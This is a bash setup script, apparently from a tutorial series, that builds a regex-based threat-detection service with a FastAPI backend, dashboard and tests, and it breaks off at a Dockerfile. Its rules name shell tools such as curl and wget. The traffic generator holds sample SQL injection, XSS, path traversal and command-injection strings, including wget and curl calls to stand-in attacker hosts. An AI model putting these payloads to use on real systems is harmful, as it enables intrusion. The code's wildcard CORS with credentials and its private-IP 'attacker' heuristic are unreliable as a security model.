#!/bin/bash

# Day 157: Threat Detection Rules Implementation
# Complete setup script with real implementation

set -e

PROJECT_NAME="day157-threat-detection"
PYTHON_VERSION="3.11"

echo "🚀 Day 157: Threat Detection Rules - Complete Setup"
echo "=================================================="

# Create project structure
echo "📁 Creating project structure..."
mkdir -p ${PROJECT_NAME}/{src/{engine,rules,models,api,dashboard},tests/{unit,integration},config,data,logs,web/{static,templates}}
cd ${PROJECT_NAME}

# Ensure logs directory exists
mkdir -p logs

# Create requirements.txt with latest May 2025 libraries
cat > requirements.txt << 'EOF'
fastapi==0.111.0
uvicorn[standard]==0.30.1
pydantic==2.7.4
pyyaml==6.0.1
redis==5.0.4
aiohttp==3.9.5
pytest==8.2.2
pytest-asyncio==0.23.7
websockets==12.0
jinja2==3.1.4
python-multipart==0.0.9
structlog==24.2.0
pandas==2.2.2
numpy==1.26.4
matplotlib==3.9.0
aiofiles==23.2.1
EOF

# Create configuration file
cat > config/rules_config.yaml << 'EOF'
detection_rules:
  sql_injection:
    - name: "Basic SQL Injection"
      pattern: "(?i)(union.*select|insert.*into|drop.*table|select.*from|delete.*from)"
      severity: "HIGH"
      category: "web_attack"
      action: "block_and_alert"
    
    - name: "Advanced SQL Injection"
      pattern: "(?i)(exec(\\s|\\+)+(s|x)p\\w+|'\\s*or\\s*'1'\\s*=\\s*'1)"
      severity: "CRITICAL"
      category: "web_attack"
      action: "block_and_alert"
  
  xss_attack:
    - name: "Basic XSS"
      pattern: "(?i)(<script[^>]*>.*?</script>|javascript:|onerror=|onload=)"
      severity: "HIGH"
      category: "web_attack"
      action: "block_and_alert"
    
    - name: "Advanced XSS"
      pattern: "(?i)(eval\\(|expression\\(|<iframe|<embed|<object)"
      severity: "HIGH"
      category: "web_attack"
      action: "alert"
  
  brute_force:
    - name: "Failed Login Pattern"
      pattern: "failed.*login|authentication.*failed|invalid.*password"
      severity: "MEDIUM"
      category: "auth_attack"
      action: "track_and_alert"
      threshold: 5
      time_window: 60
    
    - name: "Distributed Brute Force"
      pattern: "failed.*login"
      severity: "CRITICAL"
      category: "auth_attack"
      action: "block_and_alert"
      threshold: 3
      distributed: true
  
  command_injection:
    - name: "Shell Command Injection"
      pattern: "(?i)(;|\\||&&|\\$\\(|`)(cat|ls|wget|curl|bash|sh|cmd|powershell)"
      severity: "CRITICAL"
      category: "system_attack"
      action: "block_and_alert"
  
  path_traversal:
    - name: "Directory Traversal"
      pattern: "(\\.\\./|\\.\\.\\/|%2e%2e%2f|%252e%252e%252f)"
      severity: "HIGH"
      category: "file_attack"
      action: "block_and_alert"
  
  data_exfiltration:
    - name: "Large Data Transfer"
      pattern: "transfer.*size|download.*bytes"
      severity: "MEDIUM"
      category: "data_leak"
      action: "alert"
      threshold: 1073741824  # 1GB

thresholds:
  log_processing_rate: 1000  # logs per second
  alert_latency_ms: 10
  false_positive_rate: 0.05
  
monitoring:
  metrics_interval: 10
  dashboard_port: 8000
  websocket_port: 8001
EOF

# Create data models
cat > src/models/__init__.py << 'EOF'
from pydantic import BaseModel, Field
from typing import Optional, Dict, Any, List
from datetime import datetime
from enum import Enum

class SeverityLevel(str, Enum):
    LOW = "LOW"
    MEDIUM = "MEDIUM"
    HIGH = "HIGH"
    CRITICAL = "CRITICAL"

class ThreatCategory(str, Enum):
    WEB_ATTACK = "web_attack"
    AUTH_ATTACK = "auth_attack"
    SYSTEM_ATTACK = "system_attack"
    FILE_ATTACK = "file_attack"
    DATA_LEAK = "data_leak"

class LogEntry(BaseModel):
    timestamp: datetime = Field(default_factory=datetime.now)
    source_ip: str
    endpoint: str
    method: str
    payload: str
    user_agent: Optional[str] = None
    user_id: Optional[str] = None
    status_code: Optional[int] = None
    metadata: Dict[str, Any] = Field(default_factory=dict)

class DetectionRule(BaseModel):
    name: str
    pattern: str
    severity: SeverityLevel
    category: ThreatCategory
    action: str
    threshold: Optional[int] = None
    time_window: Optional[int] = None
    distributed: bool = False

class ThreatDetection(BaseModel):
    detection_id: str
    timestamp: datetime = Field(default_factory=datetime.now)
    rule_name: str
    severity: SeverityLevel
    category: ThreatCategory
    log_entry: LogEntry
    matched_pattern: str
    confidence: float
    action_taken: str
    context: Dict[str, Any] = Field(default_factory=dict)
EOF

# Create pattern matcher
cat > src/engine/pattern_matcher.py << 'EOF'
import re
from typing import List, Dict, Optional, Tuple
from src.models import DetectionRule, LogEntry
import structlog

logger = structlog.get_logger()

class PatternMatcher:
    def __init__(self):
        self.compiled_patterns: Dict[str, re.Pattern] = {}
        self.match_count = 0
        
    def compile_rules(self, rules: List[DetectionRule]) -> None:
        """Compile regex patterns for performance"""
        for rule in rules:
            try:
                self.compiled_patterns[rule.name] = re.compile(
                    rule.pattern,
                    re.IGNORECASE | re.MULTILINE
                )
                logger.info("compiled_rule", rule_name=rule.name)
            except re.error as e:
                logger.error("pattern_compile_failed", rule=rule.name, error=str(e))
    
    def match(self, log_entry: LogEntry, rule: DetectionRule) -> Optional[Tuple[bool, str]]:
        """Match log entry against a specific rule"""
        if rule.name not in self.compiled_patterns:
            return None
        
        pattern = self.compiled_patterns[rule.name]
        
        # Search in payload, endpoint, and user_agent
        search_fields = [
            log_entry.payload,
            log_entry.endpoint,
            log_entry.user_agent or ""
        ]
        
        for field in search_fields:
            match = pattern.search(field)
            if match:
                self.match_count += 1
                return True, match.group(0)
        
        return None
    
    def get_stats(self) -> Dict[str, int]:
        """Get matcher statistics"""
        return {
            "total_matches": self.match_count,
            "compiled_patterns": len(self.compiled_patterns)
        }
EOF

# Create rule evaluation engine
cat > src/engine/rule_engine.py << 'EOF'
import asyncio
from typing import List, Dict, Optional
from collections import defaultdict, deque
from datetime import datetime, timedelta
import uuid
from src.models import DetectionRule, LogEntry, ThreatDetection, SeverityLevel
from src.engine.pattern_matcher import PatternMatcher
import structlog

logger = structlog.get_logger()

class RuleEngine:
    def __init__(self, rules: List[DetectionRule]):
        self.rules = rules
        self.pattern_matcher = PatternMatcher()
        self.pattern_matcher.compile_rules(rules)
        
        # State tracking for stateful rules
        self.failed_login_tracker: Dict[str, deque] = defaultdict(deque)
        self.distributed_attacks: Dict[str, List] = defaultdict(list)
        
        # Performance metrics
        self.total_logs_processed = 0
        self.total_detections = 0
        self.detections_by_severity = defaultdict(int)
        
    async def evaluate(self, log_entry: LogEntry) -> List[ThreatDetection]:
        """Evaluate log entry against all rules"""
        self.total_logs_processed += 1
        detections = []
        
        # Sort rules by severity (process critical first)
        sorted_rules = sorted(
            self.rules,
            key=lambda r: ["LOW", "MEDIUM", "HIGH", "CRITICAL"].index(r.severity),
            reverse=True
        )
        
        for rule in sorted_rules:
            detection = await self._evaluate_rule(log_entry, rule)
            if detection:
                detections.append(detection)
                self.total_detections += 1
                self.detections_by_severity[detection.severity] += 1
                
                # Short-circuit on critical detections
                if detection.severity == SeverityLevel.CRITICAL:
                    break
        
        return detections
    
    async def _evaluate_rule(
        self,
        log_entry: LogEntry,
        rule: DetectionRule
    ) -> Optional[ThreatDetection]:
        """Evaluate a single rule"""
        
        # Pattern matching
        match_result = self.pattern_matcher.match(log_entry, rule)
        if not match_result:
            return None
        
        matched, matched_pattern = match_result
        
        # Stateful evaluation for certain rule types
        if rule.threshold and rule.time_window:
            if not self._check_threshold(log_entry, rule):
                return None
        
        # Calculate confidence based on context
        confidence = self._calculate_confidence(log_entry, rule, matched_pattern)
        
        # Create detection
        detection = ThreatDetection(
            detection_id=str(uuid.uuid4()),
            rule_name=rule.name,
            severity=rule.severity,
            category=rule.category,
            log_entry=log_entry,
            matched_pattern=matched_pattern,
            confidence=confidence,
            action_taken=rule.action,
            context=self._build_context(log_entry, rule)
        )
        
        logger.warning(
            "threat_detected",
            detection_id=detection.detection_id,
            rule=rule.name,
            severity=rule.severity,
            source_ip=log_entry.source_ip
        )
        
        return detection
    
    def _check_threshold(self, log_entry: LogEntry, rule: DetectionRule) -> bool:
        """Check if threshold exceeded for stateful rules"""
        key = log_entry.source_ip if not rule.distributed else log_entry.user_id
        if not key:
            return False
        
        now = datetime.now()
        tracker = self.failed_login_tracker[key]
        
        # Clean old entries
        while tracker and (now - tracker[0]) > timedelta(seconds=rule.time_window):
            tracker.popleft()
        
        tracker.append(now)
        
        return len(tracker) >= rule.threshold
    
    def _calculate_confidence(
        self,
        log_entry: LogEntry,
        rule: DetectionRule,
        matched_pattern: str
    ) -> float:
        """Calculate detection confidence"""
        confidence = 0.7  # Base confidence
        
        # Increase confidence for known attack IPs
        if self._is_known_attacker(log_entry.source_ip):
            confidence += 0.2
        
        # Increase confidence for multiple pattern matches
        if len(matched_pattern) > 20:
            confidence += 0.1
        
        return min(confidence, 1.0)
    
    def _is_known_attacker(self, ip: str) -> bool:
        """Check if IP is in known attacker database"""
        # Simplified check - in production, query threat intelligence DB
        return ip.startswith("192.168.") or ip.startswith("10.")
    
    def _build_context(self, log_entry: LogEntry, rule: DetectionRule) -> Dict:
        """Build context information for detection"""
        return {
            "endpoint": log_entry.endpoint,
            "method": log_entry.method,
            "status_code": log_entry.status_code,
            "user_agent": log_entry.user_agent,
            "rule_category": rule.category,
            "historical_attacks": len(self.failed_login_tracker.get(log_entry.source_ip, []))
        }
    
    def get_stats(self) -> Dict:
        """Get engine statistics"""
        return {
            "total_logs_processed": self.total_logs_processed,
            "total_detections": self.total_detections,
            "detections_by_severity": dict(self.detections_by_severity),
            "detection_rate": (
                self.total_detections / self.total_logs_processed
                if self.total_logs_processed > 0 else 0
            ),
            **self.pattern_matcher.get_stats()
        }
EOF

# Create threat classifier
cat > src/engine/threat_classifier.py << 'EOF'
from typing import List, Dict
from collections import defaultdict
from src.models import ThreatDetection, SeverityLevel
import structlog

logger = structlog.get_logger()

class ThreatClassifier:
    def __init__(self):
        self.threat_scores: Dict[str, float] = {
            SeverityLevel.LOW: 1.0,
            SeverityLevel.MEDIUM: 2.5,
            SeverityLevel.HIGH: 5.0,
            SeverityLevel.CRITICAL: 10.0
        }
        self.classification_history = defaultdict(list)
    
    def classify_threat_level(self, detections: List[ThreatDetection]) -> Dict:
        """Classify overall threat level from multiple detections"""
        if not detections:
            return {
                "threat_level": "NONE",
                "risk_score": 0.0,
                "recommended_action": "monitor"
            }
        
        # Calculate cumulative risk score
        risk_score = sum(
            self.threat_scores[d.severity] * d.confidence
            for d in detections
        )
        
        # Determine threat level
        if risk_score >= 20:
            threat_level = "CRITICAL"
            recommended_action = "immediate_response"
        elif risk_score >= 10:
            threat_level = "HIGH"
            recommended_action = "investigate_urgently"
        elif risk_score >= 5:
            threat_level = "MEDIUM"
            recommended_action = "investigate"
        else:
            threat_level = "LOW"
            recommended_action = "log_and_monitor"
        
        classification = {
            "threat_level": threat_level,
            "risk_score": risk_score,
            "recommended_action": recommended_action,
            "detection_count": len(detections),
            "severity_breakdown": self._get_severity_breakdown(detections),
            "category_breakdown": self._get_category_breakdown(detections)
        }
        
        # Track classification
        self.classification_history[threat_level].append(classification)
        
        return classification
    
    def _get_severity_breakdown(self, detections: List[ThreatDetection]) -> Dict:
        """Get count of detections by severity"""
        breakdown = defaultdict(int)
        for detection in detections:
            breakdown[detection.severity] += 1
        return dict(breakdown)
    
    def _get_category_breakdown(self, detections: List[ThreatDetection]) -> Dict:
        """Get count of detections by category"""
        breakdown = defaultdict(int)
        for detection in detections:
            breakdown[detection.category] += 1
        return dict(breakdown)
    
    def get_classification_stats(self) -> Dict:
        """Get classification statistics"""
        return {
            "total_classifications": sum(
                len(v) for v in self.classification_history.values()
            ),
            "by_threat_level": {
                k: len(v) for k, v in self.classification_history.items()
            }
        }
EOF

# Create API endpoints
cat > src/api/threat_api.py << 'EOF'
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from typing import List
import asyncio
import json
from datetime import datetime
from src.models import LogEntry, ThreatDetection
from src.engine.rule_engine import RuleEngine
from src.engine.threat_classifier import ThreatClassifier
import structlog

logger = structlog.get_logger()

class ThreatDetectionAPI:
    def __init__(self, rule_engine: RuleEngine):
        self.app = FastAPI(title="Threat Detection API")
        self.rule_engine = rule_engine
        self.classifier = ThreatClassifier()
        self.active_websockets: List[WebSocket] = []
        
        # CORS
        self.app.add_middleware(
            CORSMiddleware,
            allow_origins=["*"],
            allow_credentials=True,
            allow_methods=["*"],
            allow_headers=["*"],
        )
        
        self._setup_routes()
    
    def _setup_routes(self):
        @self.app.post("/api/analyze")
        async def analyze_log(log_entry: LogEntry):
            """Analyze a single log entry"""
            detections = await self.rule_engine.evaluate(log_entry)
            classification = self.classifier.classify_threat_level(detections)
            
            # Broadcast to websockets
            await self._broadcast_detection(detections, classification)
            
            return {
                "log_id": log_entry.metadata.get("id", "unknown"),
                "detections": [d.dict() for d in detections],
                "classification": classification,
                "analyzed_at": datetime.now().isoformat()
            }
        
        @self.app.get("/api/stats")
        async def get_stats():
            """Get detection statistics"""
            return {
                "engine_stats": self.rule_engine.get_stats(),
                "classifier_stats": self.classifier.get_classification_stats(),
                "active_connections": len(self.active_websockets)
            }
        
        @self.app.websocket("/ws/threats")
        async def websocket_endpoint(websocket: WebSocket):
            """WebSocket endpoint for real-time threat updates"""
            await websocket.accept()
            self.active_websockets.append(websocket)
            
            try:
                while True:
                    await asyncio.sleep(1)
            except WebSocketDisconnect:
                self.active_websockets.remove(websocket)
    
    async def _broadcast_detection(self, detections: List[ThreatDetection], classification: dict):
        """Broadcast detection to all connected websockets"""
        if not detections or not self.active_websockets:
            return
        
        message = {
            "type": "threat_detection",
            "timestamp": datetime.now().isoformat(),
            "detections": [
                {
                    "id": d.detection_id,
                    "severity": d.severity,
                    "rule": d.rule_name,
                    "source_ip": d.log_entry.source_ip,
                    "confidence": d.confidence
                }
                for d in detections
            ],
            "classification": classification
        }
        
        disconnected = []
        for ws in self.active_websockets:
            try:
                await ws.send_json(message)
            except:
                disconnected.append(ws)
        
        # Clean up disconnected websockets
        for ws in disconnected:
            self.active_websockets.remove(ws)
EOF

# Create main application
cat > src/main.py << 'EOF'
import asyncio
import yaml
from pathlib import Path
import uvicorn
from fastapi import Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from src.models import DetectionRule, SeverityLevel, ThreatCategory
from src.engine.rule_engine import RuleEngine
from src.api.threat_api import ThreatDetectionAPI
import structlog

structlog.configure(
    processors=[
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.JSONRenderer()
    ]
)

logger = structlog.get_logger()

def load_rules_from_config(config_path: str) -> list:
    """Load detection rules from YAML configuration"""
    with open(config_path, 'r') as f:
        config = yaml.safe_load(f)
    
    rules = []
    for category, rule_list in config['detection_rules'].items():
        for rule_dict in rule_list:
            rule = DetectionRule(
                name=rule_dict['name'],
                pattern=rule_dict['pattern'],
                severity=SeverityLevel(rule_dict['severity']),
                category=ThreatCategory(rule_dict['category']),
                action=rule_dict['action'],
                threshold=rule_dict.get('threshold'),
                time_window=rule_dict.get('time_window'),
                distributed=rule_dict.get('distributed', False)
            )
            rules.append(rule)
    
    return rules

def setup_dashboard(app):
    """Setup dashboard route"""
    templates_path = Path(__file__).parent.parent / "web" / "templates"
    templates = Jinja2Templates(directory=str(templates_path))
    
    @app.get("/dashboard", response_class=HTMLResponse)
    async def dashboard(request: Request):
        return templates.TemplateResponse("dashboard.html", {"request": request})

async def main():
    logger.info("starting_threat_detection_system")
    
    # Load rules
    config_path = Path(__file__).parent.parent / "config" / "rules_config.yaml"
    rules = load_rules_from_config(str(config_path))
    logger.info("rules_loaded", count=len(rules))
    
    # Initialize rule engine
    rule_engine = RuleEngine(rules)
    
    # Initialize API
    api = ThreatDetectionAPI(rule_engine)
    
    # Add dashboard route
    setup_dashboard(api.app)
    
    # Start API server
    config = uvicorn.Config(
        api.app,
        host="0.0.0.0",
        port=8000,
        log_level="info"
    )
    server = uvicorn.Server(config)
    
    logger.info("api_server_starting", port=8000)
    await server.serve()

if __name__ == "__main__":
    asyncio.run(main())
EOF

# Create web dashboard
cat > web/templates/dashboard.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Threat Detection Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        h1 {
            color: white;
            text-align: center;
            margin-bottom: 30px;
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: transform 0.2s;
        }
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 12px rgba(0,0,0,0.2);
        }
        .stat-label {
            color: #666;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 10px;
        }
        .stat-value {
            font-size: 2.5em;
            font-weight: bold;
            color: #667eea;
        }
        .threat-feed {
            background: white;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            max-height: 600px;
            overflow-y: auto;
        }
        .threat-item {
            padding: 15px;
            border-left: 4px solid;
            margin-bottom: 15px;
            border-radius: 4px;
            background: #f8f9fa;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        .severity-CRITICAL { border-left-color: #dc3545; }
        .severity-HIGH { border-left-color: #fd7e14; }
        .severity-MEDIUM { border-left-color: #ffc107; }
        .severity-LOW { border-left-color: #28a745; }
        .threat-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        .threat-severity {
            font-weight: bold;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.85em;
        }
        .severity-CRITICAL { background: #dc3545; color: white; }
        .severity-HIGH { background: #fd7e14; color: white; }
        .severity-MEDIUM { background: #ffc107; color: #333; }
        .severity-LOW { background: #28a745; color: white; }
        .threat-details {
            color: #666;
            font-size: 0.9em;
            line-height: 1.6;
        }
        .connection-status {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 10px 20px;
            border-radius: 20px;
            font-size: 0.9em;
            font-weight: bold;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }
        .connected {
            background: #28a745;
            color: white;
        }
        .disconnected {
            background: #dc3545;
            color: white;
        }
        .charts-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .chart-card {
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .chart-title {
            font-size: 1.2em;
            font-weight: bold;
            margin-bottom: 15px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="connection-status" id="connectionStatus">Connecting...</div>
        
        <h1>🛡️ Threat Detection Dashboard</h1>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-label">Total Detections</div>
                <div class="stat-value" id="totalDetections">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Critical Threats</div>
                <div class="stat-value" id="criticalThreats" style="color: #dc3545;">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Logs Processed</div>
                <div class="stat-value" id="logsProcessed">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Detection Rate</div>
                <div class="stat-value" id="detectionRate">0%</div>
            </div>
        </div>
        
        <h2 style="color: white; margin-bottom: 15px;">🔴 Live Threat Feed</h2>
        <div class="threat-feed" id="threatFeed">
            <p style="text-align: center; color: #999;">Waiting for threat detections...</p>
        </div>
    </div>

    <script>
        let ws;
        let stats = {
            total: 0,
            critical: 0,
            processed: 0,
            detectionRate: 0
        };

        function connectWebSocket() {
            ws = new WebSocket('ws://localhost:8000/ws/threats');
            
            ws.onopen = () => {
                document.getElementById('connectionStatus').textContent = '🟢 Connected';
                document.getElementById('connectionStatus').className = 'connection-status connected';
                console.log('WebSocket connected');
            };
            
            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                if (data.type === 'threat_detection') {
                    displayThreat(data);
                    updateStats();
                }
            };
            
            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
            };
            
            ws.onclose = () => {
                document.getElementById('connectionStatus').textContent = '🔴 Disconnected';
                document.getElementById('connectionStatus').className = 'connection-status disconnected';
                setTimeout(connectWebSocket, 3000);
            };
        }

        function displayThreat(data) {
            const feed = document.getElementById('threatFeed');
            
            // Clear placeholder
            if (feed.children[0]?.tagName === 'P') {
                feed.innerHTML = '';
            }
            
            data.detections.forEach(detection => {
                const item = document.createElement('div');
                item.className = `threat-item severity-${detection.severity}`;
                
                const timestamp = new Date(data.timestamp).toLocaleTimeString();
                
                item.innerHTML = `
                    <div class="threat-header">
                        <strong>${detection.rule}</strong>
                        <span class="threat-severity severity-${detection.severity}">${detection.severity}</span>
                    </div>
                    <div class="threat-details">
                        <div>🕒 ${timestamp}</div>
                        <div>🌐 Source IP: ${detection.source_ip}</div>
                        <div>📊 Confidence: ${(detection.confidence * 100).toFixed(1)}%</div>
                        <div>⚠️ Threat Level: ${data.classification.threat_level}</div>
                        <div>🎯 Action: ${data.classification.recommended_action}</div>
                    </div>
                `;
                
                feed.insertBefore(item, feed.firstChild);
                
                // Keep only last 50 items
                while (feed.children.length > 50) {
                    feed.removeChild(feed.lastChild);
                }
                
                // Update counters
                stats.total++;
                if (detection.severity === 'CRITICAL') {
                    stats.critical++;
                }
            });
        }

        function updateStats() {
            fetch('http://localhost:8000/api/stats')
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    if (data && data.engine_stats) {
                        document.getElementById('totalDetections').textContent = 
                            data.engine_stats.total_detections || 0;
                        document.getElementById('criticalThreats').textContent = 
                            data.engine_stats.detections_by_severity?.CRITICAL || 0;
                        document.getElementById('logsProcessed').textContent = 
                            data.engine_stats.total_logs_processed || 0;
                        const rate = data.engine_stats.detection_rate || 0;
                        document.getElementById('detectionRate').textContent = 
                            (rate * 100).toFixed(1) + '%';
                    }
                })
                .catch(error => {
                    console.error('Error fetching stats:', error);
                });
        }

        // Initialize
        connectWebSocket();
        updateStats(); // Initial stats load
        setInterval(updateStats, 5000);
    </script>
</body>
</html>
EOF

# Create test data generator
cat > src/data_generator.py << 'EOF'
import random
import asyncio
import aiohttp
from datetime import datetime
from src.models import LogEntry

class ThreatDataGenerator:
    def __init__(self, api_url: str = "http://localhost:8000"):
        self.api_url = api_url
        
        self.benign_payloads = [
            "GET /api/users HTTP/1.1",
            "POST /api/login HTTP/1.1",
            "GET /dashboard HTTP/1.1",
            "POST /api/update HTTP/1.1"
        ]
        
        self.malicious_payloads = [
            # SQL Injection
            "' OR '1'='1' --",
            "UNION SELECT username, password FROM users",
            "'; DROP TABLE users; --",
            
            # XSS
            "<script>alert('XSS')</script>",
            "javascript:alert(document.cookie)",
            "<img src=x onerror=alert('XSS')>",
            
            # Command Injection
            "; cat /etc/passwd",
            "| wget http://malicious.com/shell.sh",
            "&& curl attacker.com",
            
            # Path Traversal
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd"
        ]
    
    def generate_log_entry(self, malicious: bool = False) -> LogEntry:
        """Generate a log entry"""
        return LogEntry(
            timestamp=datetime.now(),
            source_ip=f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            endpoint="/api/endpoint",
            method=random.choice(["GET", "POST", "PUT", "DELETE"]),
            payload=random.choice(self.malicious_payloads if malicious else self.benign_payloads),
            user_agent="Mozilla/5.0",
            status_code=200 if not malicious else random.choice([200, 403, 500]),
            metadata={"id": str(random.randint(1000, 9999))}
        )
    
    async def send_log(self, session: aiohttp.ClientSession, log_entry: LogEntry):
        """Send log entry to API"""
        try:
            # Use model_dump_json to properly serialize datetime
            import json
            log_json = log_entry.model_dump_json()
            log_dict = json.loads(log_json)
            async with session.post(
                f"{self.api_url}/api/analyze",
                json=log_dict
            ) as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return None
        except Exception as e:
            print(f"Error sending log: {e}")
            return None
    
    async def generate_traffic(self, duration: int = 60, rate: int = 10):
        """Generate traffic for specified duration"""
        print(f"🚀 Generating traffic for {duration} seconds at {rate} logs/sec")
        print(f"   20% will be malicious traffic")
        
        async with aiohttp.ClientSession() as session:
            start_time = datetime.now()
            logs_sent = 0
            
            while (datetime.now() - start_time).seconds < duration:
                # Generate batch
                batch_tasks = []
                for _ in range(rate):
                    is_malicious = random.random() < 0.2  # 20% malicious
                    log_entry = self.generate_log_entry(malicious=is_malicious)
                    batch_tasks.append(self.send_log(session, log_entry))
                
                # Send batch
                await asyncio.gather(*batch_tasks)
                logs_sent += rate
                
                if logs_sent % 100 == 0:
                    print(f"   Sent {logs_sent} logs...")
                
                await asyncio.sleep(1)
        
        print(f"✅ Traffic generation complete. Sent {logs_sent} logs")

async def main():
    generator = ThreatDataGenerator()
    # Run continuously instead of just 60 seconds
    await generator.generate_traffic(duration=3600, rate=10)  # Run for 1 hour

if __name__ == "__main__":
    asyncio.run(main())
EOF

# Create unit tests
cat > tests/unit/test_pattern_matcher.py << 'EOF'
import pytest
from src.engine.pattern_matcher import PatternMatcher
from src.models import DetectionRule, LogEntry, SeverityLevel, ThreatCategory

def test_sql_injection_detection():
    """Test SQL injection pattern matching"""
    matcher = PatternMatcher()
    
    rule = DetectionRule(
        name="SQL Injection",
        pattern="(?i)(union.*select|drop.*table)",
        severity=SeverityLevel.HIGH,
        category=ThreatCategory.WEB_ATTACK,
        action="block"
    )
    
    matcher.compile_rules([rule])
    
    # Malicious log
    malicious_log = LogEntry(
        source_ip="192.168.1.100",
        endpoint="/api/users",
        method="GET",
        payload="' UNION SELECT * FROM users --"
    )
    
    result = matcher.match(malicious_log, rule)
    assert result is not None
    assert result[0] is True
    
    # Benign log
    benign_log = LogEntry(
        source_ip="192.168.1.100",
        endpoint="/api/users",
        method="GET",
        payload="user_id=123"
    )
    
    result = matcher.match(benign_log, rule)
    assert result is None

def test_xss_detection():
    """Test XSS pattern matching"""
    matcher = PatternMatcher()
    
    rule = DetectionRule(
        name="XSS Attack",
        pattern="(?i)(<script|javascript:|onerror=)",
        severity=SeverityLevel.HIGH,
        category=ThreatCategory.WEB_ATTACK,
        action="block"
    )
    
    matcher.compile_rules([rule])
    
    xss_log = LogEntry(
        source_ip="10.0.0.1",
        endpoint="/comment",
        method="POST",
        payload="<script>alert('XSS')</script>"
    )
    
    result = matcher.match(xss_log, rule)
    assert result is not None
    assert "script" in result[1].lower()
EOF

cat > tests/unit/test_rule_engine.py << 'EOF'
import pytest
from src.engine.rule_engine import RuleEngine
from src.models import DetectionRule, LogEntry, SeverityLevel, ThreatCategory

@pytest.mark.asyncio
async def test_rule_evaluation():
    """Test rule engine evaluation"""
    rules = [
        DetectionRule(
            name="SQL Injection",
            pattern="(?i)union.*select",
            severity=SeverityLevel.HIGH,
            category=ThreatCategory.WEB_ATTACK,
            action="block"
        )
    ]
    
    engine = RuleEngine(rules)
    
    malicious_log = LogEntry(
        source_ip="192.168.1.100",
        endpoint="/api/users",
        method="GET",
        payload="' UNION SELECT password FROM users"
    )
    
    detections = await engine.evaluate(malicious_log)
    
    assert len(detections) > 0
    assert detections[0].severity == SeverityLevel.HIGH
    assert detections[0].rule_name == "SQL Injection"

@pytest.mark.asyncio
async def test_multiple_rule_evaluation():
    """Test evaluation against multiple rules"""
    rules = [
        DetectionRule(
            name="SQL Injection",
            pattern="(?i)union.*select",
            severity=SeverityLevel.HIGH,
            category=ThreatCategory.WEB_ATTACK,
            action="block"
        ),
        DetectionRule(
            name="XSS",
            pattern="(?i)<script",
            severity=SeverityLevel.HIGH,
            category=ThreatCategory.WEB_ATTACK,
            action="block"
        )
    ]
    
    engine = RuleEngine(rules)
    
    # Log with XSS
    xss_log = LogEntry(
        source_ip="10.0.0.1",
        endpoint="/comment",
        method="POST",
        payload="<script>alert('test')</script>"
    )
    
    detections = await engine.evaluate(xss_log)
    assert len(detections) == 1
    assert detections[0].rule_name == "XSS"
EOF

# Create integration test
cat > tests/integration/test_api.py << 'EOF'
import pytest
from fastapi.testclient import TestClient
from src.main import load_rules_from_config
from src.engine.rule_engine import RuleEngine
from src.api.threat_api import ThreatDetectionAPI
from pathlib import Path

@pytest.fixture
def test_client():
    config_path = Path(__file__).parent.parent.parent / "config" / "rules_config.yaml"
    rules = load_rules_from_config(str(config_path))
    engine = RuleEngine(rules)
    api = ThreatDetectionAPI(engine)
    return TestClient(api.app)

def test_analyze_endpoint(test_client):
    """Test log analysis endpoint"""
    log_data = {
        "timestamp": "2025-06-16T10:00:00",
        "source_ip": "192.168.1.100",
        "endpoint": "/api/users",
        "method": "GET",
        "payload": "' UNION SELECT * FROM users",
        "user_agent": "Mozilla/5.0",
        "status_code": 200,
        "metadata": {"id": "test123"}
    }
    
    response = test_client.post("/api/analyze", json=log_data)
    assert response.status_code == 200
    
    data = response.json()
    assert "detections" in data
    assert len(data["detections"]) > 0
    assert "classification" in data

def test_stats_endpoint(test_client):
    """Test statistics endpoint"""
    response = test_client.get("/api/stats")
    assert response.status_code == 200
    
    data = response.json()
    assert "engine_stats" in data
    assert "classifier_stats" in data
EOF

# Create Dockerfile
cat > Dockerfile << 'EOF'
FROM python:3.11-slim
